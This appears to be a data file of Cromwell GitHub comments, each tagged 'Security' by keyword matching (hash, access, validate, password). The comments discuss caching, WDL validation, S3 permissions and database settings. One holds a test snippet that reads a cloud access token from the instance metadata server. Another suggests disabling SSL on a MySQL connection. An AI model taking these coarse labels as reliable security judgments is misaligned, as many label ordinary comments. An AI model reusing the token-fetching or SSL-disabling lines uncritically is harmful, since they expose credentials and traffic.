Security,"That makes sense, and I understand the concerns around call caching discussed in the linked issue. If this ENV injection will never be supported is there another recommended method for a workflow to pass information about itself outside cromwell as this seems to be something many people have requested (dating back at least 6 years based on that issue). Right now, as far as I'm aware, the only option is to poll the REST API which is suboptimal if you're running many workflows at once, and also means that the external service must be authed to either Terra or wherever your standalone cromwell server lives. It would be very useful for those of us that already have systems for tracking metadata, sample information, etc if cromwell had the ability to notify those systems when results were available somehow. Either through a step in the workflow itself as requested above, or perhaps via webhooks or similar. If not the injection solution above, is anything like that on the roadmap, or is this just not something the team is planning on addressing? Everyone has limited resources and I get that certain things just aren't a priority.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855:111,inject,injection,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591332855,2,['inject'],['injection']
Security,"That was actually my first thought. But with this:; ```; version 1.0. workflow main {; call main {; input:; x = 1; }; }. task main {; input {; Int x; }. command <<<; echo ~{if (x == 1) then 1 else 0}; >>>; }; ```; when I parse it:; ```; $ java -jar womtool-52.jar validate main.wdl ; ERROR: Unexpected symbol (line 16, col 16) when parsing '_gen23'. Expected rparen, got """". echo ~{if (x == 1) then 1 else 0}; ^. $e = :lparen $_gen23 :rparen -> TupleLiteral( values=$1 ); ```; I was under the impression that Cromwell automatically adds parentheses but I am not really sure how it actually works.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5602#issuecomment-667242825:264,validat,validate,264,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5602#issuecomment-667242825,1,['validat'],['validate']
Security,"That's definitely a key aspect of the ask here, yea! We'd also love for some validation of the docker containers (and anything else that you can think to move into validate).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-386025133:77,validat,validation,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-386025133,2,['validat'],"['validate', 'validation']"
Security,"That's what I was thinking, yes. But that's a bit tricky because bash scripts don't really ""return"" anything. Perhaps each unique image (based on the hash) could be assigned its own directory within Cromwell, and that directory is set as the working directory for both `pull-docker` and `submit-docker`. Then, you can build the image into the CWD in `pull-docker`, and run it in `submit-docker` by just globbing for a `.sif` file (or whatever format it is)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4673#issuecomment-465849356:150,hash,hash,150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4673#issuecomment-465849356,1,['hash'],['hash']
Security,"The ""resume"" part in @kcibul explanation made me think that we could actually separate the ""resume"" case from the ""I use call caching to simulate resume"" case, although it's probably not the solution for this and I'm not even sure it's a good idea at all.; We could imagine a resume endpoint that takes a workflowId and a WDL, and same way call caching works now, re-uses succeeded task outputs (except this time no need to copy them because we're still running the same workflow technically) from this workflow previous run as long as their hash matches the one of the new WDL, and when they don't or/and the job was failed, run it again. It'd be very similar to ""call caching without copying files"" in the end, just conceptually a bit different as it would be the same workflow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-306065516:542,hash,hash,542,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-306065516,2,['hash'],['hash']
Security,"The HTTP library we use [0] does not support proxies [1], therefore it is not possible for Cromwell to support them either without a whole-library replacement. The certificate error is normal and a red herring, it occurs because certs apply to domain names and not IP addresses. I can reproduce it locally with no proxy. [0] https://github.com/broadinstitute/cromwell/blob/17efd599d541a096dc5704991daeaefdd794fefd/project/Dependencies.scala#L166; [1] https://github.com/http4s/blaze/issues/656",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7136#issuecomment-1544540814:164,certificate,certificate,164,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7136#issuecomment-1544540814,1,['certificate'],['certificate']
Security,"The WDL is part of an entire pipeline, that I can't post here. But I can share this:; [WDLTesting.zip](https://github.com/broadinstitute/cromwell/files/6827255/WDLTesting.zip). ```; $ $CROMWELL_HOME/womtool validate WDLTesting/src/wdl/Workflow.wdl ; Failed to import 'WDLTesting/src/wdl/WriteTask.wdl' (reason 1 of 1): ERROR: Unexpected symbol (line 11, col 2) when parsing 'setter'. Expected equal, got ""String"". 	String	input2 = ""Default""; ^. $setter = :equal $e -> $1; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881118722:207,validat,validate,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881118722,1,['validat'],['validate']
Security,"The `CwlV1_0LanguageFactory` can `validateNamespace` (used in `MaterializeWorkflowDescriptorActor`) but lacks any concept of `WomBundle`, the output of `getWomBundle` and the input to `createExecutable`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4119#issuecomment-425466052:34,validat,validateNamespace,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4119#issuecomment-425466052,1,['validat'],['validateNamespace']
Security,The case I inspected has error in only one of the 17 shards (of the same scatter). For example:. ```bash; $ for i in $(ls shard-*/*.log); do echo $i; grep Requester $i; done; BaseRecalibrator-0.log; BaseRecalibrator-10.log; BaseRecalibrator-11.log; BaseRecalibrator-12.log; BaseRecalibrator-13.log; BaseRecalibrator-14.log; BaseRecalibrator-15.log; BaseRecalibrator-16.log; BaseRecalibrator-1.log; BaseRecalibrator-2.log; BaseRecalibrator-3.log; BaseRecalibrator-4.log; BaseRecalibrator-5.log; BaseRecalibrator-6.log; BaseRecalibrator-7.log; BaseRecalibrator-8.log; BaseRecalibrator-9.log; ServiceException: 401 Requester pays bucket access requires authentication.; ServiceException: 401 Requester pays bucket access requires authentication.; ServiceException: 401 Requester pays bucket access requires authentication.; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-436261622:634,access,access,634,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-436261622,6,"['access', 'authenticat']","['access', 'authentication']"
Security,"The comment in the keel PR asserts that the hashes returned in `Docker-Content-Digest` and within the body are the same, but in my limited testing on Docker Hub, Quay and GCR that did not seem to be the case. If the body value actually represents something other than the image digest it may cause downstream issues for Cromwell to treat as such. . Basically this issue needs more investigation. Since ECR support is apparently not as a high a priority as originally thought this issue has been deprioritized for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-487639234:44,hash,hashes,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-487639234,1,['hash'],['hashes']
Security,"The document that contains the cross-site AJAX calls would need to be; served with the Access-Control-Allow-Origin * HTTP header. Does Cromwell; ever serve documents that contain AJAX calls?. On Wed, Nov 8, 2017 at 10:06 AM, Chris Llanwarne <notifications@github.com>; wrote:. >; > - I don't think Cromwell had any opinions on where it gets called from; > (it's all stateless REST queries over HTTP) - could you give an example of; > what you're trying to do?; > - I've only ever seen Access-Control-Allow-Origin in reference to web; > browser behavior; > - Maybe you have something in front of Cromwell that's blocking you?; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-342845454>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AG_4aDbsUjYVfFiIoOCTyoVz92Oc3UUvks5s0cOFgaJpZM4QRuA->; > .; >. -- ; Oliver Ruebenacker; Senior Software Engineer, Diabetes Portal; <http://www.type2diabetesgenetics.org/>, Broad Institute; <http://www.broadinstitute.org/>",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-342872932:87,Access,Access-Control-Allow-Origin,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-342872932,2,['Access'],['Access-Control-Allow-Origin']
Security,"The following could be used as the command body of a Centaur WDL to test this feature (copy-paste-edited from Thibault's [`docker_size_gcr.wdl`](https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/standardTestCases/docker_size/docker_size_gcr.wdl)):; ```; apt-get install --assume-yes jq > /dev/null; NAME=`curl -s -H ""Metadata-Flavor: Google"" http://metadata.google.internal/computeMetadata/v1/instance/name`; ZONE=`basename \`curl -s -H ""Metadata-Flavor: Google"" http://metadata.google.internal/computeMetadata/v1/instance/zone\``; PROJECT=`curl -s -H ""Metadata-Flavor: Google"" http://metadata.google.internal/computeMetadata/v1/project/project-id`; curl -s -H ""Authorization: Bearer `gcloud auth print-access-token`"" ""https://www.googleapis.com/compute/v1/projects/$PROJECT/zones/$ZONE/instances/$NAME?fields=cpuPlatform"" | jq -r '.cpuPlatform'; ```; Run on one of Jeff's legion GCE VMs this produces. ```; Intel Haswell; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-460339656:695,Authoriz,Authorization,695,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-460339656,2,"['Authoriz', 'access']","['Authorization', 'access-token']"
Security,The former. He was looking for a backend-aware validation type behavior,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231627459:47,validat,validation,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231627459,1,['validat'],['validation']
Security,"The functionality provided in this PR would be helpful to one of our users and I would love to see it merged, but this PR has languished for over 2 years. Looking it over, I have 3 questions for @illusional which may effect getting this merged:. 1. Would it make sense to change the proposed option from skipping the lookup entirely, to allowing the lookup to happen, but ignore the failure if we have a hash?; 2. Would having tests for this change make it more palatable to the maintainers?; 3. Maybe redo the PR against the current state of the repo so that there are not 2 years worth of conflicts to resolve before a merge?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435350438:404,hash,hash,404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435350438,1,['hash'],['hash']
Security,The hash failures are expected with http inputs and should not be the cause of your workflow failure. Also we don't currently support `http` in engine filesystems. Do you see any other error messages than might provide some insight into what's happening?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425981166:4,hash,hash,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425981166,1,['hash'],['hash']
Security,The impact is on all workflows not just sub. The issue is that in a multi-backend world supporting different filesystems or authentication mechanisms it is likely that the current implementation of workflow outputs copying would break.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1684#issuecomment-326406438:124,authenticat,authentication,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1684#issuecomment-326406438,1,['authenticat'],['authentication']
Security,The log output is designed for informational and debugging purposes only. The truncation is intentional because excessively large logs can destabilize production servers running 1000s of workflows. The supported mechanism for accessing output information is via the web API: https://cromwell.readthedocs.io/en/stable/api/RESTAPI/#get-the-outputs-for-a-workflow,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6209#issuecomment-794326686:226,access,accessing,226,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6209#issuecomment-794326686,1,['access'],['accessing']
Security,"The original title of this ticket turned out to be incorrect, the actual problem was needless `hashCode` computation when `Scope`s were put in `Set`s or used as `Map` keys. Thanks to @kshakir for pointing out that Scala should generate case class `equals` correctly and shouldn't have the problem I had claimed. 😄 . PR forthcoming for the `hashCode` issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1457#issuecomment-248741884:95,hash,hashCode,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1457#issuecomment-248741884,2,['hash'],['hashCode']
Security,The role granted to the EC2 that runs the Cromwell server would need to grant access to the bucket that you have specified in the outputs.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-602899024:78,access,access,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-602899024,1,['access'],['access']
Security,"The urgency of this particular fix came as we starting adding more valid CWL to PAPI and the tests were creeping past 70 minutes. I'm open to parallelizing local too. The workflow is reusable and there's currently nothing technically stopping us from switching local to parallel also. Cromwell's ""randomization"" (aka internally using unordered sets/hashmaps) when launching scatter jobs makes debugging the entire suite of tests wicked painful. It's hard to tell when a failure occurs what test was running. While CWL is in a state of flux I kind of like slowly working my way through the serial logs of local-conformance when I break something. My 2¢/ToL",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3187#issuecomment-360253011:349,hash,hashmaps,349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3187#issuecomment-360253011,1,['hash'],['hashmaps']
Security,"The use case in Cromwell is the same as FireCloud - Cromwell now will use cached data if it exists, and not if it doesn't, but you can't tell why it wasn't in cache when you expected it to be. People could do forensics themselves, but if we had this stored and accessible you could quickly see ""the docker image changed"" or ""the file changed"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256488583:261,access,accessible,261,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256488583,1,['access'],['accessible']
Security,"There hasn't unfortunately. This is sort of a desperate thought but maybe you can try to see if you can cache via file path instead of file hash (https://cromwell.readthedocs.io/en/develop/Configuring/#local-filesystem-options). I don't know if its configured to work for AWS but ""hashing-strategy"" could be set to path -- though it may only ever work for the local filesystem and not S3. ```; # Possible values: file, path, path+modtime; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; # ""path+modtime"" will compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here.; # Default: file; hashing-strategy: ""file""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-581915065:140,hash,hash,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-581915065,7,['hash'],"['hash', 'hashed', 'hashing-strategy']"
Security,"There is no directory for shard-6. That's why the workflow agent can't read the RC file. The time-stamps for the files referenced in the job parameter json, however, reflect the time that the job was re-executed. This is probably the most troubling aspect for us as it suggests that data integrity for previous samples cannot be guaranteed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-496509163:288,integrity,integrity,288,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-496509163,1,['integrity'],['integrity']
Security,There's an intention to add parentWorkflowId (or rootWorkflowId) to the metadata summary table which should allow us to query for it faster. I don't see any reason we couldn't also expose it in the `/query` result set too,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4667#issuecomment-467456003:181,expose,expose,181,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4667#issuecomment-467456003,1,['expose'],['expose']
Security,"There's another concern here that PAPIv2 doesn't ([currently](https://groups.google.com/forum/#!topic/google-genomics-discuss/newaE3R-cwY)) terminate background containers nicely once all non-background actions terminate. I.e. it uses SIGKILL, which cannot be caught in our monitoring container, and hence so far it has not been able to report the last timepoint. However, to work around that I'll add one more action, which will be _non-background_, and will run after the user action. This 2nd action will be assigned to the same `pidNamespace` as the monitoring action (which possible with PAPIv2), and hence will have access to the PID of the monitoring action and will then kill it ""nicely"" with SIGTERM, and wait for it to terminate - something like this: `killall python && wait`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-452087901:622,access,access,622,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-452087901,1,['access'],['access']
Security,"These changes are primarily focused on getting as much code into Standard as possible. Getting JES and SFS perfect wasn't a goal here though. There's a lot more work that could be done to tighten up each of those backends. Regarding JES/GCSFS: the proxy classes, that inject the custom file system providers, could likely be merged with `GcsPath`. I also have my eye on further cleaning up a lot of the path mapping, someday. For example JES calls something like `callRoot.resolve(path.stripPrefix(""/""))` in two different classes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1930#issuecomment-276229649:268,inject,inject,268,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1930#issuecomment-276229649,1,['inject'],['inject']
Security,"These removed calls to `setAccessible` are NOT technically illegal yet. They do not modify [JDK classes](https://openjdk.java.net/jeps/396) and the third-party libraries that are modified at runtime are currently weakly encapsulated. Still, if these libraries suddenly switch to modules then [`setAccessible` will then be illegal](https://docs.oracle.com/javase/9/docs/api/java/lang/reflect/AccessibleObject.html#setAccessible-boolean-). This PR uses alternatives for some of the calls to `setAccesible` in this repo, either through basic refactoring or using new APIs that weren't available back when the original workaround was implemented.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996:391,Access,AccessibleObject,391,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996,1,['Access'],['AccessibleObject']
Security,"They'll look like the two tags currently in https://hub.docker.com/r/broadinstitute/cromwell/tags/ that are:; - `23-0c25192`; - `23`. Note to future viewers: I'll be deleting the git hashed tag, but 23 should re-appear when 23 is actually released.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1668#issuecomment-261033017:183,hash,hashed,183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1668#issuecomment-261033017,1,['hash'],['hashed']
Security,"This fixes the problem at the point of expression evaluation... it seems like it might be easier (and a lot less fiddly?) to do the relative file resolution much earlier, at the point that inputs are being read in to the workflow in the first place. The `ValidatedWomNamespace` produced as part of workflow materialization contains a `womValueInputs` field... I wonder whether performing this mapping as part of creating that validated set of inputs would work?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618685855:255,Validat,ValidatedWomNamespace,255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618685855,2,"['Validat', 'validat']","['ValidatedWomNamespace', 'validated']"
Security,This is a design choice to allow workflow validation before inputs are known. You could list the required inputs and check them against what you have by running the [`inputs` command](https://cromwell.readthedocs.io/en/stable/WOMtool/#inputs).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7139#issuecomment-1551517865:42,validat,validation,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7139#issuecomment-1551517865,1,['validat'],['validation']
Security,"This is a minimal workflow that runs a task with a dynamic number of GPUs; ```version 1.0. workflow gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1003,validat,validation,1003,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757,1,['validat'],['validation']
Security,This is a possible WDL spec change with a suspected womtool validation bug riding shotgun; the womtool bug looks to have been resolved,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-464220393:60,validat,validation,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-464220393,1,['validat'],['validation']
Security,"This is also something we would want for our cluster. Users are not allowed to run docker containers on our HPC (that would give them root access :scream:). So we use cromwell on the command line instead. We modified our cromwell configuration to run with singularity containers instead of docker containers. Setting up a MySQL server somewhere is not easy for the average user. Furthermore we used to set up a MySQL server for all users on the cluster, but that meant they had to share a database user and password (they were all using the same configuration). This caused a lot of issues. . Mostly cromwell is run project based. So the call-caching is only interesting for that particular project. Also using a file-based database will automatically ensure that only people with rights to the share the project is on will have access. This is also of importance in a shared cluster environment. At LUMC we currently implement this by using the HSQLDB in-memory database with a persistence file. This has some disadvantages:; 1. Cromwell needs more memory compared to using a MySQL server; 2. The HSQLDB persistence files are huge, badly compressed (when compression is used). 3 GB is normal. Tarring and zipping will get this down to under <50 mb... ; 3. It is slower than using a MySQL server. I think that SQLite will solve problem 1 and 2. (3 is inherent to using a file-based DB). . Having a database is better than to have nothing at all, which is why many users are pining for SQLite. When looking into it I found the option for the persistence file. Although SQLite will be much better, this does not require any extra effort from the Cromwell developers and can already help out a lot of users. I will document how we did this in the Cromwell documentation so everyone can use this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-564437002:139,access,access,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-564437002,3,"['access', 'password']","['access', 'password']"
Security,"This is good for casual users, thanks @kshakir. On Tue, Oct 18, 2016 at 10:25 AM, kshakir notifications@github.com wrote:. > I feel uneasy recommending an unencrypted connection to a database,; > especially when the MySQL team went out of their way to start warning about; > this issue.; > ; > That said, the simplest copypasta you can use to remove that warning is to; > pass the specified parameter in your database url:; > ; > In this stanza, change the url from:; > ; > db {; > driver = ""com.mysql.jdbc.Driver""; > url = ""jdbc:mysql://host/cromwell""; > user = ""user""; > password = ""pass""; > connectionTimeout = 5000; > }; > ; > To:; > ; > db {; > driver = ""com.mysql.jdbc.Driver""; > url = ""jdbc:mysql://host/cromwell?useSSL=false""; > user = ""user""; > password = ""pass""; > connectionTimeout = 5000; > }; > ; > Or if there are already other params already on your url, append using ""&""; > instead of ""?"":; > ; > db {; > driver = ""com.mysql.jdbc.Driver""; > url = ""jdbc:mysql://host/cromwell?other=param&useSSL=false""; > user = ""user""; > password = ""pass""; > connectionTimeout = 5000; > }; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1591#issuecomment-254523992,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ACDXk53aShDWYxlKJyOGeGW4XyTntKdFks5q1NbxgaJpZM4KZ1eV; > . ## . Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1591#issuecomment-254525171:573,password,password,573,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1591#issuecomment-254525171,6,['password'],['password']
Security,This is handled differently now. We hash the runtime attribute `docker` value into a fixed-length MD5 string,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-253928605:36,hash,hash,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-253928605,1,['hash'],['hash']
Security,"This isn't due to the IDE, it's a readability thing for some definition of readability. These functions are effectively methods on `AstNode` but we can't write them as methods because we don't have (easy) access to the underlying class. In this case the implicit class is merely a vector to insert those methods so we aren't calling them as functions. This way it's clear that `foo` is acting on `a` when you say `a.foo(x)` instead of `foo(a, x)`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/50#issuecomment-112552200:205,access,access,205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/50#issuecomment-112552200,2,['access'],['access']
Security,"This line in the stack trace indicates the root cause:. ```; at software.amazon.awssdk.services.s3.S3Client.listBuckets(S3Client.java:2184); ```. The permissions for the Cromwell server currently only provide full access to the S3 bucket specified in the CloudFormation template. Adding the `AmazonS3ReadOnlyAccess` managed policy to the server's instance profile fixes this, but I wonder if it can be more refined. Specifically, is there a case where a Cromwell server would need to read from more than one bucket?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-500068947:214,access,access,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-500068947,1,['access'],['access']
Security,"This looks like a more specific version of https://github.com/broadinstitute/cromwell/issues/2209 - to work around this I bet the validation will work without the string interpolation:; ```; output {; File gvcf = gvcf; File gvcf_index = gvcf + "".tbi""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298670361:130,validat,validation,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298670361,1,['validat'],['validation']
Security,"This might be conflating two issues, but in case it is related, another error we are consistently seeing that seems dependent on which docker container we use (which may be a red herring, but that's all I can narrow it down to), we'll run something and get this error: ; ```; ""callCaching"": {; ""hashFailures"": [; {; ""message"": ""[Attempted 1 time(s)] - NoSuchFileException: s3://s3.amazonaws.com/some-bucket/cromwell-tests/Kraken2_test_input.fastq.gz"",; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""s3://s3.amazonaws.com/some-bucket/cromwell-tests/Kraken2_test_input.fastq.gz""; }; ]; }; ],; ```. Meanwhile, the input location of the input file is this:; ```; ""inputs"": {; ""input_fastq"": {; ""format"": null,; ""location"": ""s3://some-bucket/cromwell-tests/Kraken2_test_input.fastq.gz"",; ""size"": null,; ""secondaryFiles"": [],; ""contents"": null,; ""checksum"": null,; ""class"": ""File""; },; ```; So it's being given a valid S3 URL but then when it's trying to get the hash, it's looking at an invalid S3 URL (the one with s3.amazonaws.com isn't valid, but wasn't supplied by us). Thoughts? Is this a separate issue?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457651066:295,hash,hashFailures,295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457651066,3,"['checksum', 'hash']","['checksum', 'hash', 'hashFailures']"
Security,This seems functionally correct to me... but is it easy to add a test case for this? . I'm slightly worried that the `override def getScheme: String` function could be being used elsewhere in the system - and that might cause problems when `drs://` files are accessed later on.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5115#issuecomment-521012487:259,access,accessed,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5115#issuecomment-521012487,1,['access'],['accessed']
Security,"This seems like a good candidate to expose to some posthumous you know whating, at least to the extent that it's possible currently.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/233#issuecomment-147091798:36,expose,expose,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/233#issuecomment-147091798,1,['expose'],['expose']
